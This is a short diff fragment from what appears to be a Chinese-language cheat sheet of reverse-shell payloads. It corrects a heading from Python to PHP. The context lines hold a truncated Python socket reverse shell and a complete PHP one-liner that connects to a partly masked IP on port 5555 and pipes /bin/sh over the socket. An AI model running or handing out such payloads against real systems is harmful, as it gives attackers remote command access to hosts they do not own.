@@ -209,7 +209,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 
 
-**利用python反弹shell-Payload**
+**利用PHP反弹shell-Payload**
 
 ```bash
 php -r '$sock=fsockopen("10x.2xx.150.37",5555);exec("/bin/sh -i <&3 >&3 2>&3");'
